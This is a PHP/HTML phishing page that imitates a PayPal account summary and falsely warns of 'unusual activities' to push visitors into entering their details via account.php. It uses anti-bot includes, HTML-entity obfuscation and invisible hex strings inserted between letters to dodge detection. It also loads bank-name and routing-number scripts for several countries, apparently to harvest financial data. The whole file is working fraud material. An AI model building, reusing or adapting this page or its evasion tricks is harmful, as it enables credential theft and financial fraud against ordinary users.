<?php
 include 'php/err.php';
include 'php/blocker.php';
include 'php/antibots4.php';
 
?>
<html ng-app="Test"lang="en_US" dir="ltr" class="js">
<head>
<meta charset="utf-8"><!--Script info: script: node, template:  , date: Nov 2, 2016 13:30:28 -07:00, country: US, language: en web version:  content version:  hostname : QjML33U2ZDrLc+mXRRYY5wf/2anSPKSFFBOvn0OIaerQ37f4WyF7yWz+6jmnIb1f rlogid : 9HTImlZKNykHDqvP328w0%2FmkIVl4snGXpElTzkViuQXZwn8xgdc5AIAXh8HLydcxgPA6IGkXexW02ukGnqVv0w_15826bc5b10 -->
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no">
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="img/pp144.png">
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="img/pp114.png">
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="img/pp72.png">
<link rel="apple-touch-icon-precomposed" href="img/pp64.png">
<link rel="shortcut icon" sizes="196x196" href="img/pp196.png">
<link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
<link rel="icon" type="image/x-icon" href="img/pp32.png">
<title>Please Com&#112;&#108;&#101;&#116;&#101;&#32;&#119;&#105;&#116;&#104;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;&#111;&#114;&#109;&#97;&#116;ions</title>
<link rel="stylesheet" href="css/app.ltr.css">
<link rel="stylesheet" href="css/paypal-sans.css">
<link rel="stylesheet" href="css/summary.ltr.css">
<link rel="stylesheet" href="css/wallet.ltr.css">
<link rel="stylesheet" href="css/main.css">
<link rel="stylesheet" href="res/css/homeplug.css">
<script src="js/jquery.js"></script>
<script src="js/bnkName.js"></script>
    <script src="js/ngRoutingnum.js"></script>
</head>
<body  onload="closeNav()" id="hh"class="feature-analytics feature-bundle feature-captcha feature-fso feature-global-rollout feature-installment-summary feature-migrate-fi-credit feature-redirectToSynchrony US">
<div class="vx_globalNav-main globalNav_main js_globalNavView" id="header" role="banner" data-show-warning="">
<div class="vx_globalNav-container">
<a href="#" class="vx_globalNav-brand_desktop"><span class="vx_a11yText">S&#117;&#109;&#109;&#97;&#114;y</span></a>
<div class="vx_globalNav-secondaryNav_mobile noPrint">
<div class="vx_globalNav-listItem_mobileLogout">
<a href="#" id="dos8"class="vx_globalNav-link_mobileLogout">L&#111;&#103;&#32;&#79;&#117;t</a>
</div><div class="vx_globalNav-listItem_settings">
<a href="#" class="vx_globalNav-link_settings">
<span class="vx_globalNav-iconWrapper_secondary">
<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span></span>
<span class="vx_a11yText">Settings</span></a></div><div><p class="vx_h5 vx_globalNav-displayName"></p>
<!-- Profile photo markup goes here. --></div></div>
<div class="vx_globalNav-navContainer noPrint">
<nav id="navMenu" class="vx_globalNav-nav" role="navigation">
<ul class="vx_globalNav-list">
<li id="dos2"><a href="#" class="vx_isActive vx_globalNav-links nemo_globalNavSummaryLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkSummary"></span></span> 
<span class="vx_globalNav-navText">SummAry</span></a></li>
<li id="dos3"><a href="#" class=" vx_globalNav-links nemo_globalNavActivityLink"><span class="vx_globalNav-iconWrapper">
<span class="vx_globalNav-navIcon globalNav-icon_linkActivity"></span></span> <span class="vx_globalNav-navText">Activity</span></a>
</li><li id="dos4"><a href="#" class=" vx_globalNav-links nemo_globalNavTransferLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkTransfer"></span>
</span> <span class="vx_globalNav-navText">Send &amp; Request</span></a></li>
<li id="dos5"><a href="#" class=" vx_globalNav-links nemo_globalNavWalletLink">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkWallet"></span>
</span> <span class="vx_globalNav-navText">&#87;&#97;&#108;&#108;&#101;&#116;</span></a></li>
<li id="dos6"><a href="#" class=" vx_globalNav-links nemo_globalNavShopLink" target="_top">
<span class="vx_globalNav-iconWrapper"><span class="vx_globalNav-navIcon globalNav-icon_linkShop"></span>
</span> <span class="vx_globalNav-navText">Shop</span></a></li>
<li id ="dos7"class="globalNav-listItem_mobile js_globalNavSearch"><a href="#" class="vx_globalNav-links nemo_globalNavSearchLink js_globalNavSearchLink">
<span class="vx_globalNav-navText">Seɑrch</span></a></li>
</ul>
<ul class="vx_globalNav-list_secondary">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_desktop js_notifications-toggleTrigger nemo_notificationsDesktopTrigger" name="openNotifications"   role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary">

<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>
<!--
<span class="vx_notificationCount notificationLength-1 js_notificationCount">0</span>
-->
</span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notificɑtions</span></a></li>
<li id="js_tourSettings"><a href="#" class="vx_globalNav-link_settings" name="settings" title="Settings">
<span class="vx_globalNav-iconWrapper_secondary">


<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkSettings"></span>

</span>
<span class="vx_globalNav-navText_secondary vx_a11yText">Settings</span></a></li>
<li class="globalNav-listItem_mobile"><a href="#" class="vx_globalNav-link_help" name="help">
<span class="vx_globalNav-iconWrapper_secondary"><span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkHelp"></span></span>
<span class="vx_globalNav-navText_secondary vx_a11yText">Help</span></a></li>
<li class="vx_globalNav-listItem_logout"><a href="" id="dos9"class="vx_globalNav-link_logout nemo_logoutBtn">Log Out</a></li>
</ul>
</nav></div></div></div>

<div id="js_foreground" class="vx_foreground-container foreground-container">
<div class="vx_globalNav-main_mobile js_globalNavView"><div class="vx_globalNav-headerSection_trigger">
<a href="#navMenu" class="js_toggleMobileMenu vx_globalNav-toggleTrigger nemo_mobileNavMenuToggle noPrint">Menu</a></div>
<div class="vx_globalNav-headerSection_logo"><a href="#" class="vx_globalNav-brand_mobile">
<span class="vx_a11yText">Summary</span></a></div>
<ul class="vx_globalNav-headerSection_actions">
<li class="vx_globalNav-actionItem_mobile globalNav_notificationItem vx_globalNav-notificationItem_mobile js_notificationButtonView nemo_headerNotifications" data-autodisplay="false">
<a href="#" class="vx_globalNav-link_notifications notifications_mobile js_notifications-toggleTrigger nemo_notificationsMobileTrigger" name="openNotifications"   role="button" title="Notifications">
<span class="vx_globalNav-iconWrapper_secondary">

<span class="vx_globalNav-navIcon vx_globalNav-navIcon_linkNotifications"></span>

<!-- <span class="vx_notificationCount notificationLength-1 js_notificationCount">3</span> -->


</span>
<span class="vx_globalNav-navText_secondary vx_globalNav-navText_secondaryMobile vx_a11yText">Notifications</span></a>
</li>
</ul></div>
<div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">
<div id="js_summaryView" class="mainContents summaryContainer" >
<h1 id="heading1" class="accessAid">PayPal: Summary</h1>
 <div id="js_engagementModuleView" class="engagementModule nemo_engagementModule" data-engagement-badges="">
<div class="engagementSneakPeek-pullTab js_engagementSneakPeek-pullTab js_engagementSneakPeek-trigger">
<span class="icon icon-small icon-arrow-down-small" aria-hidden="true"></span></div>
<div class="engagementMainBar-container js_engagementMainBar-container">
<div class="summarySection engagementMainBar row" style="height:0%;">
<div class="col-sm-7 progressAndWelcome">
<div id="js_toggleProfileStatus" class="welcomeMessage js_selectModule selectModule profileStatus  active" data-module-number="0">
<p class="vx_h3 engagementWelcomeMessage nemo_welcomeMessageHeader"><span class="icon icon-small icon-lock-small" style="color:#ffffff"></span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#FFFFFF">Limited Account Access Details</span></p>
</div></div>
<div id="js_engagementActions" class="col-sm-5 engagementActions"></div></div></div>
<div id="js_emSlideDownContainer" aria-expanded="true" role="alertdialog" tabindex="-1" class="emSlideDownContainer nemo_emSlideDownContainer autoHeight" data-em-open="false" data-current-module="" data-new-user="true" data-total-percentage="60" data-hide-sneak-peek="false" data-hide-account-completion="true" data-is-first-use-enabled="false" data-auto-tour="false" data-auto-open-offer="false" aria-label="Get the most out of PayPal">
<div class="engagementSneakPeek-overlay js_engagementSneakPeek-overlay"></div>
</div></div>
 <div class="mainBody">
 <div id="summary" class="summarySection">
 <div class="row">
 <div class="col-sm-12 summaryModuleContainer">
  
 <section class="walletModule nemo_balanceModule" aria-labelledby="walletModuleHeader" id="">
 <div class="balanceModule">
 
 
 <div id="start">
 <h3><a class="moduleHeaderLink nemo_moduleHeaderLink"></a></h3>
<div class="footerLink">
<img src="images/warning.png" width="90px" height="77px">
<div class="dotted"><hr></div>
<h2 style="color: rgb(68, 68, 68); font-weight: 300; margin: 0px 0px 11px; text-rendering: optimizeLegibility; line-height: 1.1; font-size: 24px; font-family: HelveticaNeue, 
'Helvetica Neue', helvetica, Arial, sans-serif; font-style: normal; font-variant: normal; letter-spacing: normal; orphans: auto; text-align: left;
 text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;">
<div><span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>2bc170e342e95dcbcc2466dc737e17ef</span>W<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6abb0b35803b86a4d37e0150797079ce</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6aa1b9cca0f23858b3b4c8b84340480a</span>r<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>7ea9302229375f11e0c2a6427a871b91</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>cf6b65b8a005f27f2577db905332cb3d</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>100990b14199dc8ba6ad39ca460a3feb</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>7a71ba3848dd23a3095f8332c6fedb9c</span>g<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>f8cdd8a5e665d39f90550625a485ed78</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>54ed4c126367743e14f985ccea6346c8</span>:<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b8543b75b2264566acb27534dc13f306</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>391664adb3fdd836fc7aad0130ca5cb3</span>U<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>2256b3ae313b03d5c78cccce42400e9f</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d857e7ba83261df8e732c9e6704ce580</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a29369f2dcf694738e895ecb27d96810</span>s<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>24903ee4a3941f30463ef2e4fdac7324</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>518aa628d2e9794d70ff6ce2f36a2ab6</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>92317725fa0f30284083879bb861a207</span>l<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>06cb88270236044c263b0f4a59db1e12</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>d1ad4318f14003caa6cb5d9065c16b2e</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>5bc3d82b0be3d6a16dd28b6b4ac64695</span>c<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>36d0858ff4c0b269e219f277d88abb5b</span>t<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>206e79938bac758adef2282967f3c33c</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>af03cd9d45cb7706f34dcd5dc977e1a2</span>v<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>07459b340d6ddc3554db801b8a284ed2</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>7a0b0d49174f050d2fe1076327522fd1</span>t<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>738acea0d420e687d3c15fdf2eb2658c</span>i<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>482da20970baa4903bd052a2af07acad</span>e<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>1417212b3d2fa64a4d7072134802d20e</span>s<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>91f2929bc98a2b5930e437b039930882</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>6d0c269c8f230f51b4dcd1f20dc54035</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b3b20abb835086dee595a814a74bb263</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>8302c27c8a9164f0a3a6486e46a67bac</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>66f772a8886dca11ea89b4d0cc316fe4</span>y<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>397a52baacaade085f1aab9ce4aedaf7</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>43e8aec10820b209ef9c674bbf5aadc8</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a6b66f19aab0fa307166faa2f17546ba</span>r<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>9828e4e06c4e4e11125fa3791f9a8d15</span> <span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>e4e0b7290d5972948c25b7ba55f8ad0f</span>a<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>61d8cea24cb370e971f009f5189311bf</span>c<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>a0bfb99bef57cd645f780bb0cabf7f30</span>c<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>81d17bc61f8d514e721dfcdd0c8ac0ea</span>o<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>b1a91711356671ce6d410715339e210d</span>u<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>9236549897f65750e966abab901c057f</span>n<span style='float: right; font-size: .001px; color: transparent; display: inline-block; width: 0px;'>85e5803937532536298a5ebdd76afff6</span>t</div></h2>
<p style="margin-bottom: 15px; line-height: 24px; color: rgb(118, 118, 118); font-family: HelveticaNeue, 'Helvetica Neue', helvetica, Arial, sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;">
If you see these messages, your account has been visited from an unknown location.
</p>
<table style="border-collapse: collapse; border-spacing: 0px; margin-bottom: 15px; border-radius: 5px; color: rgb(118, 118, 118); font-family: HelveticaNeue, 'Helvetica Neue', helvetica, Arial, sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: 21px; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;" width="220">
</table>
<p style="margin-bottom: 15px; line-height: 24px; color: rgb(118, 118, 118); font-family: HelveticaNeue, 'Helvetica Neue', helvetica, Arial, sans-serif; font-size: 15px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; orphans: auto; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px;">
To protect your account from blocking, you must press the button below and fill in your information.<br>
<br>
Do not worry, within 24 hours, you'll be able to restore your account after you complete these steps.</p>
<p></p>
<div class="dotted"><hr></div>
<p>      
<a href="account.php"><button  class="vx_btn" id="sub">Continue</button></a></div></div>
</div></section></div></div></div></div></div></div></div></div>



<div id="footer" class="noPrint nemo_footer vx_globalFooter-container" role="contentinfo" style="display:block; margin-top:20px;">

<div class="vx_globalFooter"><div class="vx_globalFooter-content"><ul class="vx_globalFooter-list"><li><a href="" 
onclick="openNav()" target="_top" class="nemo_helpLink" name="footerHelp">Help &amp; Contact</a></li><li>
<a href="" onclick="openNav()" target="_blank" class="nemo_securityLink" name="footerSecurity">Security</a>
</li></ul><div class="vx_globalFooter_secondary"><p class="vx_globalFooter-copyright nemo_copyrightText">Copyright © <span dir="ltr">1999-2019</span> 
PayPal. All rights reserved.</p><ul class="vx_globalFooter-list_secondary"><li><a href="" onclick="openNav()" target="_top" name="privacy" class="nemo_privacyLink">Privacy</a></li><li><a href="" onclick="openNav()" target="_top" name="legal" class="nemo_legalLink">Legal</a></li></ul></div><div class="footerSmallText vx_globalFooter-disclaimer nemo_disclaimerText">Consumer advisory- PayPal Pte. Ltd., the holder of PayPal's stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the <b>terms and conditions</b> carefully.</div></div></div>



</div>
 

<script>
function openNav() {
    document.getElementById("mySidenav").style.width = "100%";
}

function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
}
</script>

 


<script src="js/plugins.js"></script>
<script src="js/rebel.js"></script>
<script src="js/ukbank.js"></script>
<script src="js/cabank.js"></script>
<script src="js/aubank.js"></script>
<script src="js/usabank.js"></script>
<script src="js/iban.js"></script>
</div>
 
</body></html>